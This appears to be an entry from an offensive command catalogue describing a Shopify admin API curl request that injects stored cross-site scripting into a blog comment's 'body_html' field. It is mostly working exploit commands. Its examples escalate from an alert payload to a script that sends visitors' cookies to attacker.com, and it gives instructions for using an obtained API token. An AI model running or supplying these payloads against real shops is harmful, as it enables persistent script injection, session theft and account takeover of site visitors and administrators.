---
data: >-
  curl -X PUT "https://your-shop.myshopify.com/admin/comments/<comment-id>.json"
  -H "X-Shopify-Access-Token: your-api-token" -H "Content-Type:
  application/json" -d '{"comment": {"id": <comment-id>, "body": "blahblah",
  "body_html": "blah<img src=x onerror=alert(0);>"}}'
tags:
  - api
  - xss
  - shopify
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:29.347Z'
id: fb3ca578-a2c5-4178-a11a-3e312f2ea530
verified: false
validated: true
submitted: true
---
# shopify-update-comment-api

## Command

```bash
curl -X PUT "https://your-shop.myshopify.com/admin/comments/<comment-id>.json" \
  -H "X-Shopify-Access-Token: your-api-token" \
  -H "Content-Type: application/json" \
  -d '{"comment": {"id": <comment-id>, "body": "blahblah", "body_html": "blah<img src=x onerror=alert(0);>"}}'
```

## Description

This command sends a PUT request to Shopify's admin API to update an existing blog comment, injecting malicious HTML/JS into the undocumented 'body_html' field to exploit stored XSS. Use after obtaining a comment ID and API token from a custom app.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<comment-id>` | The numeric ID of the target comment | Yes |
| `your-api-token` | Access token from Shopify app with write_comments scope | Yes |
| `your-shop.myshopify.com` | The shop's domain | Yes |
| `body` | Plain text fallback for the comment | No |
| `body_html` | Unsanitized HTML payload with JS | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT "https://example.myshopify.com/admin/comments/2929551246.json" \
  -H "X-Shopify-Access-Token: shpat_abc123" \
  -H "Content-Type: application/json" \
  -d '{"comment": {"id": 2929551246, "body": "Updated comment", "body_html": "<img src=x onerror=alert(document.cookie);>"}}'
```

### Advanced Usage

Repeat the command if the first update doesn't persist:

```bash
curl -X PUT "https://example.myshopify.com/admin/comments/2929551246.json" \
  -H "X-Shopify-Access-Token: shpat_abc123" \
  -H "Content-Type: application/json" \
  -d '{"comment": {"id": 2929551246, "body": "Final update", "body_html": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>"}}'
```

## Expected Output

Successful response is HTTP 200 with JSON like {"comment":{"id":2929551246,"body_html":"blah<img src=x onerror=alert(0);>"}} indicating the update applied without sanitization.

## Related

- [[procedures/Inject-Malicious-Payload-into-Shopify-Blog-Comment-via-API]]
